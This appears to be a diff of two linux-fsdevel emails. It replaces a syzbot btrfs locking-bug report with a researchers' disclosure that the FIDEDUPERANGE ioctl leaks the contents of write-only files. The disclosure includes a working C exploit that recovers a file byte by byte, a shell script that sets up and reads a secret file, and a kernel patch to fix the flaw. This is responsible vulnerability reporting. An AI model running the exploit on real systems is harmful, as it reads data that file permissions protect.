@@ -2,50 +2,51 @@ Return-Path: <linux-fsdevel-owner@vger.kernel.org>
 X-Original-To: lists+linux-fsdevel@lfdr.de
 Delivered-To: lists+linux-fsdevel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 01D70571960
-	for <lists+linux-fsdevel@lfdr.de>; Tue, 12 Jul 2022 14:03:36 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 2CC6F5719B7
+	for <lists+linux-fsdevel@lfdr.de>; Tue, 12 Jul 2022 14:18:18 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S232902AbiGLMDd (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
-        Tue, 12 Jul 2022 08:03:33 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:50920 "EHLO
+        id S229729AbiGLMSQ (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
+        Tue, 12 Jul 2022 08:18:16 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:36338 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S230305AbiGLMD3 (ORCPT
+        with ESMTP id S229572AbiGLMSP (ORCPT
         <rfc822;linux-fsdevel@vger.kernel.org>);
-        Tue, 12 Jul 2022 08:03:29 -0400
-Received: from mail-io1-f70.google.com (mail-io1-f70.google.com [209.85.166.70])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 9FDDF1DA53
-        for <linux-fsdevel@vger.kernel.org>; Tue, 12 Jul 2022 05:03:25 -0700 (PDT)
-Received: by mail-io1-f70.google.com with SMTP id x4-20020a6bd004000000b00675354ad495so4177576ioa.20
-        for <linux-fsdevel@vger.kernel.org>; Tue, 12 Jul 2022 05:03:25 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
-        bh=+F3CLkcWxHEXZdXQEcfO2GuvqxGPDoVXGJ9ah/g01A8=;
-        b=yGvl/bOcv0l/Hqfss692T6wrVSUhPMZ9nNiH0tPI1Teko7YWkg/6rxFkIeGAhjP/zQ
-         Bxx4Crud+e5BWLRv+748cctiPWiayOt6Y0ns9emJt6zCFDQpDJbhYPkJturFVDhsirnF
-         WnmiBftO/xlo8PDzD3aEnOjw6ucdy6IG6PMzSPIkcX/9MnAUd2s6GxAuFAA1jD2yZipR
-         EgBjCCnj5mdKPgSODGiTZFxhJLjFxPQ9DmLXFFJ5UzVBKx/Uu7nmMuEfPBsDHhKqQw7N
-         FjKfdVJFtzUj5DdFFUFr+QYXePUZW5Pz5977+onvJn1zm/c410eypSj9+8+Nkr0k8z6b
-         cfQQ==
-X-Gm-Message-State: AJIora88qJarecWL1RgFYrYQ5uEp4QQzug+oZyVM4MImAtjNyhvM1RV2
-        WT5OoONP8WuQlgLUTEzqaHoXzuheYWWmIcq8+wNVVioaUrAS
-X-Google-Smtp-Source: AGRyM1tc18D3QDk9ZXZzVbihko7yyFDJmdvq1GZlYDVcn5AE8VZ2E0IcLcXq4Mgg3Lj/SgWXR7sV6vRAsQBLvhRqtmoPLyK+m/vf
+        Tue, 12 Jul 2022 08:18:15 -0400
+X-Greylist: delayed 402 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Tue, 12 Jul 2022 05:18:13 PDT
+Received: from mail-relay230.hrz.tu-darmstadt.de (mail-relay230.hrz.tu-darmstadt.de [130.83.156.230])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 39A754D4C0
+        for <linux-fsdevel@vger.kernel.org>; Tue, 12 Jul 2022 05:18:13 -0700 (PDT)
+Received: from smtp.tu-darmstadt.de (mail-relay158.hrz.tu-darmstadt.de [IPv6:2001:41b8:83f:1611::158])
+        (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+         key-exchange X25519 server-signature RSA-PSS (4096 bits)
+         client-signature RSA-PSS (4096 bits))
+        (Client CN "mail-relay158.hrz.tu-darmstadt.de", Issuer "DFN-Verein Global Issuing CA" (not verified))
+        by mail-relay230.hrz.tu-darmstadt.de (Postfix) with ESMTPS id 4Lj03L1JMBz43qr;
+        Tue, 12 Jul 2022 14:11:26 +0200 (CEST)
+Received: from [IPV6:2001:41b8:810:20:3da5:807c:fa4d:1353] (unknown [IPv6:2001:41b8:810:20:3da5:807c:fa4d:1353])
+        (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+         key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
+        (Client did not present a certificate)
+        by smtp.tu-darmstadt.de (Postfix) with ESMTPSA id 4Lj03J5lfQz43Vh;
+        Tue, 12 Jul 2022 14:11:24 +0200 (CEST)
+Message-ID: <a7c93559-4ba1-df2f-7a85-55a143696405@tu-darmstadt.de>
+Date:   Tue, 12 Jul 2022 14:11:24 +0200
 MIME-Version: 1.0
-X-Received: by 2002:a05:6e02:1446:b0:2dc:3511:d313 with SMTP id
- p6-20020a056e02144600b002dc3511d313mr11867190ilo.157.1657627405055; Tue, 12
- Jul 2022 05:03:25 -0700 (PDT)
-Date:   Tue, 12 Jul 2022 05:03:25 -0700
-X-Google-Appengine-App-Id: s~syzkaller
-X-Google-Appengine-App-Id-Alias: syzkaller
-Message-ID: <000000000000a5fe4305e39a746c@google.com>
-Subject: [syzbot] BUG: sleeping function called from invalid context in __xas_nomem
-From:   syzbot <syzbot+b355e80670ac28f5263c@syzkaller.appspotmail.com>
-To:     linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org,
-        syzkaller-bugs@googlegroups.com, viro@zeniv.linux.org.uk
-Content-Type: text/plain; charset="UTF-8"
-X-Spam-Status: No, score=-1.7 required=5.0 tests=BAYES_00,FROM_LOCAL_HEX,
-        HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_NONE,RCVD_IN_MSPIKE_H2,
-        SPF_HELO_NONE,SPF_PASS,T_SCC_BODY_TEXT_LINE autolearn=no
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101
+ Thunderbird/91.11.0
+Reply-To: ansgar.loesser@kom.tu-darmstadt.de
+To:     viro@zeniv.linux.org.uk, linux-fsdevel@vger.kernel.org,
+        security@kernel.org
+Cc:     Max Schlecht <max.schlecht@informatik.hu-berlin.de>,
+        =?UTF-8?Q?Bj=c3=b6rn_Scheuermann?= 
+        <scheuermann@kom.tu-darmstadt.de>
+From:   =?UTF-8?B?QW5zZ2FyIEzDtsOfZXI=?= <ansgar.loesser@tu-darmstadt.de>
+Subject: Information Leak: FIDEDUPERANGE ioctl allows reading writeonly files
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
+X-Header-TUDa: QAy2LZ/mv4rnYAEvPe+hus7WF+1CrvJz7aabIHs1iFrjIV8t9upBOqo34ARb9MadSSmj+PEe5/UATta0nI6QETluwPE+HivVYTLMO1
+X-Spam-Status: No, score=-4.2 required=5.0 tests=BAYES_00,RCVD_IN_DNSWL_MED,
+        SPF_HELO_NONE,SPF_NONE,T_SCC_BODY_TEXT_LINE autolearn=ham
         autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
@@ -53,89 +54,208 @@ Precedence: bulk
 List-ID: <linux-fsdevel.vger.kernel.org>
 X-Mailing-List: linux-fsdevel@vger.kernel.org
 
-Hello,
+Dear Mr. Viro,
 
-syzbot found the following issue on:
+using the deduplication API we found out, that the FIDEDUPERANGE ioctl 
+syscall can be used to read a writeonly file.
+A more formal description of the bug, an example code to exploit it and 
+a proposed solution are attatched below.
 
-HEAD commit:    8e59a6a7a4fa Merge tag 'mm-hotfixes-stable-2022-07-11' of ..
-git tree:       upstream
-console output: https://syzkaller.appspot.com/x/log.txt?x=15a10ac8080000
-kernel config:  https://syzkaller.appspot.com/x/.config?x=f58350a1f5f99e22
-dashboard link: https://syzkaller.appspot.com/bug?extid=b355e80670ac28f5263c
-compiler:       gcc (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2
+In case of open questions please do not hesitate to contact us.
 
-Unfortunately, I don't have any reproducer for this issue yet.
-
-IMPORTANT: if you fix the issue, please add the following tag to the commit:
-Reported-by: syzbot+b355e80670ac28f5263c@syzkaller.appspotmail.com
-
-BUG: sleeping function called from invalid context at include/linux/sched/mm.h:274
-in_atomic(): 1, irqs_disabled(): 0, non_block: 0, pid: 10059, name: syz-executor.3
-preempt_count: 1, expected: 0
-RCU nest depth: 0, expected: 0
-2 locks held by syz-executor.3/10059:
- #0: ffff888014c5e0e0 (&type->s_umount_key#70/1){+.+.}-{3:3}, at: alloc_super+0x1dd/0xa80 fs/super.c:228
- #1: ffff8880259280c0 (&fs_info->fs_roots_lock){+.+.}-{2:2}, at: spin_lock include/linux/spinlock.h:349 [inline]
- #1: ffff8880259280c0 (&fs_info->fs_roots_lock){+.+.}-{2:2}, at: btrfs_insert_fs_root+0x78/0x2e0 fs/btrfs/disk-io.c:1708
-Preemption disabled at:
-[<0000000000000000>] 0x0
-CPU: 1 PID: 10059 Comm: syz-executor.3 Not tainted 5.19.0-rc6-syzkaller-00019-g8e59a6a7a4fa #0
-Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.14.0-2 04/01/2014
-Call Trace:
- <TASK>
- __dump_stack lib/dump_stack.c:88 [inline]
- dump_stack_lvl+0xcd/0x134 lib/dump_stack.c:106
- __might_resched.cold+0x222/0x26b kernel/sched/core.c:9821
- might_alloc include/linux/sched/mm.h:274 [inline]
- slab_pre_alloc_hook mm/slab.h:723 [inline]
- slab_alloc mm/slab.c:3285 [inline]
- __kmem_cache_alloc_lru mm/slab.c:3479 [inline]
- kmem_cache_alloc_lru+0x41b/0x8c0 mm/slab.c:3506
- __xas_nomem+0x263/0x670 lib/xarray.c:340
- __xa_insert+0x122/0x250 lib/xarray.c:1662
- xa_insert include/linux/xarray.h:774 [inline]
- btrfs_insert_fs_root+0xf7/0x2e0 fs/btrfs/disk-io.c:1709
- btrfs_get_root_ref.part.0+0x820/0xb80 fs/btrfs/disk-io.c:1855
- btrfs_get_root_ref fs/btrfs/disk-io.c:1809 [inline]
- btrfs_get_fs_root fs/btrfs/disk-io.c:1887 [inline]
- btrfs_read_roots fs/btrfs/disk-io.c:2725 [inline]
- init_tree_roots fs/btrfs/disk-io.c:3111 [inline]
- open_ctree+0x2d88/0x49d3 fs/btrfs/disk-io.c:3736
- btrfs_fill_super fs/btrfs/super.c:1455 [inline]
- btrfs_mount_root.cold+0x15/0x162 fs/btrfs/super.c:1821
- legacy_get_tree+0x105/0x220 fs/fs_context.c:610
- vfs_get_tree+0x89/0x2f0 fs/super.c:1497
- fc_mount fs/namespace.c:1043 [inline]
- vfs_kern_mount.part.0+0xd3/0x170 fs/namespace.c:1073
- vfs_kern_mount+0x3c/0x60 fs/namespace.c:1060
- btrfs_mount+0x234/0xa60 fs/btrfs/super.c:1881
- legacy_get_tree+0x105/0x220 fs/fs_context.c:610
- vfs_get_tree+0x89/0x2f0 fs/super.c:1497
- do_new_mount fs/namespace.c:3040 [inline]
- path_mount+0x1320/0x1fa0 fs/namespace.c:3370
- do_mount fs/namespace.c:3383 [inline]
- __do_sys_mount fs/namespace.c:3591 [inline]
- __se_sys_mount fs/namespace.c:3568 [inline]
- __x64_sys_mount+0x27f/0x300 fs/namespace.c:3568
- do_syscall_x64 arch/x86/entry/common.c:50 [inline]
- do_syscall_64+0x35/0xb0 arch/x86/entry/common.c:80
- entry_SYSCALL_64_after_hwframe+0x46/0xb0
-RIP: 0033:0x7f14e7c8a63a
-Code: 48 c7 c2 b8 ff ff ff f7 d8 64 89 02 b8 ff ff ff ff eb d2 e8 b8 04 00 00 0f 1f 84 00 00 00 00 00 49 89 ca b8 a5 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
-RSP: 002b:00007f14e6bfdf88 EFLAGS: 00000206 ORIG_RAX: 00000000000000a5
-RAX: ffffffffffffffda RBX: 0000000020000200 RCX: 00007f14e7c8a63a
-RDX: 0000000020000000 RSI: 0000000020000100 RDI: 00007f14e6bfdfe0
-RBP: 00007f14e6bfe020 R08: 00007f14e6bfe020 R09: 0000000020000000
-R10: 0000000000000000 R11: 0000000000000206 R12: 0000000020000000
-R13: 0000000020000100 R14: 00007f14e6bfdfe0 R15: 0000000020016800
- </TASK>
-BTRFS info (device loop3): enabling ssd optimizations
+With best regards,
+Ansgar Lößer
 
 
----
-This report is generated by a bot. It may contain errors.
-See https://goo.gl/tpsmEJ for more information about syzbot.
-syzbot engineers can be reached at syzkaller@googlegroups.com.
+FIDEDUPERANGE ioctl allows reading writeonly files
 
-syzbot will keep track of this issue. See:
-https://goo.gl/tpsmEJ#status for how to communicate with syzbot.
+The FIDEDUPERANGE ioctl can be used to read data from files that are 
+supposed
+to be writeonly on supported file systems (btrfs, xfs, ...).
+
+confirmed on 5.18.3 (amd64, debian)
+Reported-by: Ansgar Lößer (ansgar.loesser@kom.tu-darmstadt.de), Max Schlecht
+(max.schlecht@informatik.hu-berlin.de) and Björn Scheuermann
+(scheuermann@kom.tu-darmstadt.de)
+
+The FIDEDUPERANGE ioctl is intended to be able to share physical storage for
+multiple data blocks across files that contain identical data, on the 
+same file
+system. To do so, the ioctl takes a `src_fd` and `dest_fd`, as well as 
+offset
+and  length parameters, specifying data ranges should be tried to be
+deduplicated. The ioctl then compares the contents of the data ranges and
+returns the number of bytes that have been deduplicated.
+
+The issue is, that while `src_fd` has to be open for reading, `dest_fd` only
+has to be open for writing. Thus, multiple consecutive ioctl calls can 
+be used
+to read out the contents of `dest_fd`. This is done byte by byte, by trying
+different input data, until getting a successful deduplication, indicating
+equal content in the two data ranges. This technique works even if files are
+marked as `append only` in btrfs.
+
+The proposed fix is to change the required permissions, so that 
+`dest_fd` has
+to be open for reading as well.
+
+exploit code (`read_writeonly.c`)
+```C
+#define _XOPEN_SOURCE 500 // pwrite
+#include <linux/types.h>
+#include <linux/fs.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/ioctl.h>
+#include <assert.h>
+
+// use FIDEDUPERANGE ioctl to compare the target writeonly file (dest_fd)
+// with the test file (src_fd)
+int compare_fds(int src_fd, int dest_fd, __u64 offset, __u64 length)
+{
+     char buffer[sizeof(struct file_dedupe_range)
+         + sizeof(struct file_dedupe_range_info)];
+     struct file_dedupe_range* arg = (struct file_dedupe_range*)buffer;
+     arg->src_offset = 0;
+     arg->src_length = length;
+     arg->dest_count = 1;
+     arg->reserved1  = 0;
+     arg->reserved2  = 0;
+
+     struct file_dedupe_range_info* info = &arg->info[0];
+     info->dest_fd = dest_fd;
+     info->dest_offset = offset;
+     info->reserved = 0;
+
+     ioctl(src_fd, FIDEDUPERANGE, arg);
+     printf("%d_%llu ", info->status, info->bytes_deduped);
+
+     return info->status;
+}
+
+int main(int argc, char** argv)
+{
+     if (argc != 2)
+     {
+         fprintf(stderr, "./read_writeonly <filepath>\n");
+         return 0;
+     }
+
+     // open the target writeonly file
+     int target_fd = open(argv[1], O_WRONLY | O_APPEND);
+     if (target_fd == -1)
+     {
+         fprintf(stderr, "failed to open \"%s\" with %d\n", argv[1], errno);
+         return -1;
+     }
+
+     // create a test file to compare the target file with (via 
+deduplication)
+     int test_fd = open("test.tmp", O_RDWR | O_CREAT | O_TRUNC, 0777);
+     if (test_fd == -1)
+     {
+         close(target_fd);
+         fprintf(stderr, "fatal: failed to open test file with %d\n", 
+errno);
+         return -1;
+     }
+
+     __u64 file_offset = 0;
+     do
+     {
+         int status;
+         __u8 c;
+
+         for (__u16 i = 0; i < 256; i++)
+         {
+             c = (__u8)i;
+             __u64 offset = file_offset % 4096;
+             __u64 length = offset + 1;
+             __u64 block_offset = file_offset - offset;
+
+             if (offset == 0)
+             {
+                 ftruncate(test_fd, 0);
+             }
+
+             pwrite(test_fd, &c, 1, offset);
+             status = compare_fds(test_fd, target_fd, block_offset, length);
+
+             if (status == FILE_DEDUPE_RANGE_SAME || status < 0)
+             {
+                 break;
+             }
+         }
+         assert(status != FILE_DEDUPE_RANGE_DIFFERS);
+
+         if (status < 0)
+         {
+             break;
+         }
+
+         putc(c, stdout);
+
+         file_offset++;
+     } while (1);
+
+     close(target_fd);
+     close(test_fd);
+     unlink("test.tmp");
+
+     return 0;
+}
+```
+
+helper shell script (`test.sh`)
+```sh
+#!/bin/sh
+
+gcc read_writeonly.c -o read_writeonly
+
+# create writeonly file
+touch writeonly.txt
+chmod 220 writeonly.txt
+echo "secret" > writeonly.txt
+sudo chown 65535 writeonly.txt
+
+# read from writeonly file
+./read_writeonly writeonly.txt
+```
+
+proposed fix (read_writeonly.patch)
+```
+diff --git a/fs/remap_range.c b/fs/remap_range.c
+index e112b54..ad5b44d 100644
+--- a/fs/remap_range.c
++++ b/fs/remap_range.c
+@@ -414,11 +414,11 @@ static bool allow_file_dedupe(struct file *file)
+
+      if (capable(CAP_SYS_ADMIN))
+          return true;
+-    if (file->f_mode & FMODE_WRITE)
++    if ((file->f_mode & (FMODE_READ | FMODE_WRITE)) == (FMODE_READ | 
+FMODE_WRITE))
+          return true;
+      if (uid_eq(current_fsuid(), i_uid_into_mnt(mnt_userns, inode)))
+          return true;
+-    if (!inode_permission(mnt_userns, inode, MAY_WRITE))
++    if (!inode_permission(mnt_userns, inode, MAY_READ | MAY_WRITE))
+          return true;
+      return false;
+  }
+```
+
+-- 
+M.Sc. Ansgar Lößer
+Fachgebiet Kommunikationsnetze
+Fachbereich für Elektrotechnik und Informationstechnik
+Technische Universität Darmstadt
+
+Rundeturmstraße 10
+64283 Darmstadt
+
+E-Mail: ansgar.loesser@kom.tu-darmstadt.de
+http://www.kom.tu-darmstadt.de
+
